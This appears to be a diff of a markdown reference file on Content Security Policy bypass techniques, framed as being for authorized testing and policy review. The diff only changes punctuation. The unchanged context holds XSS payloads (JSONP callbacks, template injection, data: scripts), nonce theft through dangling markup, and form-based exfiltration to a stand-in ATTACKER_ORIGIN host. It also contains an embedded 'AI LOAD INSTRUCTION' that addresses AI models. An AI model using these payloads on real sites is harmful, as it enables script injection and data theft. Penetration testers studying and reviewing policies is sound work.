@@ -1,4 +1,4 @@
-# CSP Bypass — Advanced Techniques
+# CSP Bypass: Advanced Techniques
 
 For authorized testing and for reviewing a policy for weaknesses. Not for building a policy: use `../SKILL.md` for that.
 
@@ -19,9 +19,9 @@ For authorized testing and for reviewing a policy for weaknesses. Not for buildi
 | `font-src`                 | Font loading                                          | `default-src`                            |
 | `object-src`               | `<object>`, `<embed>`, `<applet>`                     | `default-src`                            |
 | `media-src`                | `<audio>`, `<video>`                                  | `default-src`                            |
-| `base-uri`                 | `<base>` element                                      | **No fallback** — unrestricted if absent |
-| `form-action`              | Form submission targets                               | **No fallback** — unrestricted if absent |
-| `frame-ancestors`          | Who can embed this page (replaces X-Frame-Options)    | **No fallback** — unrestricted if absent |
+| `base-uri`                 | `<base>` element                                      | **No fallback**: unrestricted if absent |
+| `form-action`              | Form submission targets                               | **No fallback**: unrestricted if absent |
+| `frame-ancestors`          | Who can embed this page (replaces X-Frame-Options)    | **No fallback**: unrestricted if absent |
 | `report-uri` / `report-to` | Where violation reports are sent                      | N/A                                      |
 | `navigate-to`              | Navigation targets (limited browser support)          | **No fallback**                          |
 
@@ -37,12 +37,12 @@ The app only allows scripts from its own origin. Bypass vectors:
 
 | Vector                         | Technique                                                                                                             |
 | ------------------------------ | --------------------------------------------------------------------------------------------------------------------- |
-| JSONP endpoints                | `<script src="/api/jsonp?callback=alert(1)//"></script>` — JSONP reflects callback as JS                              |
+| JSONP endpoints                | `<script src="/api/jsonp?callback=alert(1)//"></script>`: JSONP reflects callback as JS                              |
 | Uploaded JS files              | Upload `.js` file (e.g., avatar upload accepts any extension) → `<script src="/uploads/evil.js"></script>`            |
-| DOM XSS sinks                  | Find DOM sinks (innerHTML, eval, document.write) in existing same-origin JS — inject via URL fragment/param           |
+| DOM XSS sinks                  | Find DOM sinks (innerHTML, eval, document.write) in existing same-origin JS: inject via URL fragment/param           |
 | Angular/Vue template injection | If framework is loaded from `'self'`, inject template expressions: `{{constructor.constructor('alert(1)')()}}`        |
 | Service Worker                 | Register SW from same origin → intercept and modify responses                                                         |
-| Path confusion                 | `<script src="/user-content/;/legit.js">` — server returns user content due to path parsing, but URL matches `'self'` |
+| Path confusion                 | `<script src="/user-content/;/legit.js">`: server returns user content due to path parsing, but URL matches `'self'` |
 
 ### 2.2 `script-src` with CDN Whitelist
 
@@ -55,8 +55,8 @@ script-src 'self' GOOGLE_APIS_HOST GSTATIC_HOST JSDELIVR_HOST
 | `CDNJS_HOST` | Host arbitrary JS via CDNJS (find lib with callback/eval): `angular.js` → template injection          |
 | `JSDELIVR_HOST`     | jsdelivr serves any npm package or GitHub file: `JSDELIVR_HOST/npm/attacker-package@1.0.0/evil.js` |
 | `GOOGLE_APIS_HOST`     | Google JSONP endpoints, Google Maps callback parameter                                                |
-| `UNPKG_HOST`            | Same as jsdelivr — serves arbitrary npm packages                                                      |
-| `CLOUDFRONT_HOST`     | CloudFront distributions are shared — any CF customer's JS is allowed                                 |
+| `UNPKG_HOST`            | Same as jsdelivr: serves arbitrary npm packages                                                      |
+| `CLOUDFRONT_HOST`     | CloudFront distributions are shared: any CF customer's JS is allowed                                 |
 
 **Trick**: Search for JSONP endpoints on whitelisted domains: `site:GOOGLE_APIS_HOST inurl:callback`
 
@@ -82,7 +82,7 @@ Only scripts with matching nonce attribute execute.
 | Nonce injection via CRLF       | CRLF in response header → inject new CSP header with known nonce, or inject `<script nonce="known">`                |
 | Dangling markup to steal nonce | `<img src="ATTACKER_ORIGIN/steal?` (unclosed) → page content including nonce leaks as URL parameter |
 | DOM clobbering                 | Overwrite nonce-checking code via DOM clobbering: `<form id="nonce"><input id="nonce" value="attacker-controlled">` |
-| Script gadgets                 | Trusted nonced script uses DOM data to create new script elements — inject that DOM data                            |
+| Script gadgets                 | Trusted nonced script uses DOM data to create new script elements: inject that DOM data                            |
 
 ### 2.5 `script-src 'strict-dynamic'`
 
@@ -185,7 +185,7 @@ When `connect-src`, `img-src`, etc. are locked down, alternative exfiltration ch
 | `report-uri` leak     | N/A                            | Trigger CSP violation → report contains blocked-uri with data         |
 | Form submission       | `form-action`                  | `<form action="ATTACKER_ORIGIN/"><button>Submit</button></form>`      |
 
-**DNS-based exfiltration is nearly impossible to block with CSP** — this is the most reliable channel.
+**DNS-based exfiltration is nearly impossible to block with CSP**: this is the most reliable channel.
 
 ---
 
@@ -240,18 +240,18 @@ CSP present?
 
 ---
 
-## 6. TRICK NOTES — WHAT AI MODELS MISS
+## 6. TRICK NOTES: WHAT AI MODELS MISS
 
-1. **`default-src 'self'` does NOT restrict `base-uri` or `form-action`** — these have no fallback. This is the #1 CSP mistake.
+1. **`default-src 'self'` does NOT restrict `base-uri` or `form-action`**: these have no fallback. This is the #1 CSP mistake.
 2. **`strict-dynamic` ignores whitelist**: When `strict-dynamic` is present, host-based allowlists and `'self'` are ignored for script loading. Only nonce/hash and trust propagation matter.
-3. **Multiple CSPs stack**: If both `Content-Security-Policy` header and `<meta>` CSP exist, the browser enforces BOTH — the effective policy is the intersection (most restrictive).
-4. **`Content-Security-Policy-Report-Only`** does not enforce — it only reports. Check for the correct header name.
+3. **Multiple CSPs stack**: If both `Content-Security-Policy` header and `<meta>` CSP exist, the browser enforces BOTH: the effective policy is the intersection (most restrictive).
+4. **`Content-Security-Policy-Report-Only`** does not enforce: it only reports. Check for the correct header name.
 5. **Nonce length matters**: Nonces should be ≥128 bits of entropy. Short or predictable nonces can be brute-forced or guessed.
-6. **Report-uri information disclosure**: CSP violation reports sent to `report-uri` contain `blocked-uri`, `source-file`, `line-number` — this can leak internal URLs, script paths, and page structure to whoever controls the report endpoint.
-7. **`data:` in script-src**: `script-src 'self' data:` allows `<script src="data:text/javascript,alert(1)">` — trivial bypass, but commonly seen in real-world CSPs.
+6. **Report-uri information disclosure**: CSP violation reports sent to `report-uri` contain `blocked-uri`, `source-file`, `line-number`: this can leak internal URLs, script paths, and page structure to whoever controls the report endpoint.
+7. **`data:` in script-src**: `script-src 'self' data:` allows `<script src="data:text/javascript,alert(1)">`: trivial bypass, but commonly seen in real-world CSPs.
 
 ````markdown
-SKILL: CSP Bypass — Advanced Techniques
+SKILL: CSP Bypass: Advanced Techniques
 
 AI LOAD INSTRUCTION: Master per-directive bypasses, nonce/hash abuse, strict-dynamic exploitation, Trusted Types evasion, framework-specific vectors, and data exfiltration channels that survive strong CSPs. Never default to "unsafe-inline" suggestions without verifying the actual policy. Prioritize missing no-fallback directives (base-uri, object-src, form-action, frame-ancestors) and real-world misconfigurations.
 
@@ -390,7 +390,7 @@ Is CSP present? (Check headers + meta)
 └── Everything blocked? → Dangling markup + DNS/WebRTC/CSS exfil
 ```
 
-7. TRICK NOTES — WHAT MOST MODELS MISS
+7. TRICK NOTES: WHAT MOST MODELS MISS
 1. `default-src 'self'` does **not** restrict base-uri, form-action, or frame-ancestors.
 1. `strict-dynamic` ignores host whitelists and 'self' for dynamically created scripts.
 1. Nonce leakage via CSS attribute selectors + cache probing (2025+ technique).
